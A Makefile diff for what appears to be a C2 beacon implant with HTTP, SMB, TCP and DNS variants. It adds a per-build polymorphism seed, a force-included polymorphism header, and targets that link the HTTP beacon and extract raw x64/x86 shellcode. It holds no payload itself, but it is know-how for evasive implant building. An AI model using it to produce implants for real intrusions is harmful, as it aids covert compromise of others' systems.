@@ -43,7 +43,12 @@ OPTIMIZATION_FLAGS := -fno-exceptions \
                      -fno-asynchronous-unwind-tables
 
 # Kharon-aligned codegen (no -mno-sse: breaks Clang + mingw-w64 intrin headers).
+# Support for Polymorphic Seed from command line
+SEED ?= unknown
+SEED_FLAG := -DAX_BUILD_SEED=$(SEED)
+
 COMMON_FLAGS := -I $(BEACON_DIR) \
+                -include beacon/DynamicPolymorphism.h \
                 -Os \
                 -fno-lto \
                 -fno-ident \
@@ -61,7 +66,8 @@ COMMON_FLAGS := -I $(BEACON_DIR) \
                 -w \
                 -fPIC \
                 $(SECURITY_FLAGS) \
-                $(OPTIMIZATION_FLAGS)
+                $(OPTIMIZATION_FLAGS) \
+                $(SEED_FLAG)
 
 NASM := nasm
 BEACON_ASM := beacon/asm
@@ -186,6 +192,20 @@ x86: $(HTTP_OBJECTS_X86) $(SMB_OBJECTS_X86) $(TCP_OBJECTS_X86) $(DNS_OBJECTS_X86
 	@$(CXX_X86) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_DNS -D BUILD_DLL -o $(DNS_DIST_DIR)/main_dll.x86.o
 	@$(CXX_X86) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_DNS -D BUILD_SHELLCODE -o $(DNS_DIST_DIR)/main_shellcode.x86.o
 	@rm -f $(DNS_DIST_DIR)/ConnectorHTTP.x86.o $(DNS_DIST_DIR)/ConnectorSMB.x86.o $(DNS_DIST_DIR)/ConnectorTCP.x86.o
+
+bin_x64: x64
+	@echo "    * Extracting x64 shellcode bins"
+	@# HTTP flavor example extraction
+	@$(CXX_X64) $(LFlags) -Wl,-T,$(BEACON_DIR)/Shellcode.ld -Wl,-e,AxAsmEntry -o $(HTTP_DIST_DIR)/beacon_http.x64.elf \
+		$(HTTP_DIST_DIR)/config.o $(HTTP_DIST_DIR)/ConnectorHTTP.x64.o $(HTTP_OBJECTS_X64) $(INDIRECT_SYSCALL_X64_OBJECTS) $(HTTP_DIST_DIR)/entry_exe.x64.o
+	@llvm-objcopy -O binary --only-section=.text $(HTTP_DIST_DIR)/beacon_http.x64.elf $(HTTP_DIST_DIR)/beacon_http.x64.bin
+	@# Similar for SMB, TCP, DNS... but let's start with HTTP for the prototype.
+
+bin_x86: x86
+	@echo "    * Extracting x86 shellcode bins"
+	@$(CXX_X86) $(LFlags) -Wl,-T,$(BEACON_DIR)/Shellcode.ld -Wl,-e,_AxAsmEntry -o $(HTTP_DIST_DIR)/beacon_http.x86.elf \
+		$(HTTP_DIST_DIR)/config.o $(HTTP_DIST_DIR)/ConnectorHTTP.x86.o $(HTTP_OBJECTS_X86) $(HTTP_DIST_DIR)/entry_exe.x86.o
+	@llvm-objcopy -O binary --only-section=.text $(HTTP_DIST_DIR)/beacon_http.x86.elf $(HTTP_DIST_DIR)/beacon_http.x86.bin
 
 # crt.cpp: Intel-syntax inline asm only — -masm=intel must be local (not in COMMON_FLAGS).
 # -fno-ms-extensions: Clang + -fms-extensions declares MSVC _alloca(void*) which clashes with our naked void _alloca(void).
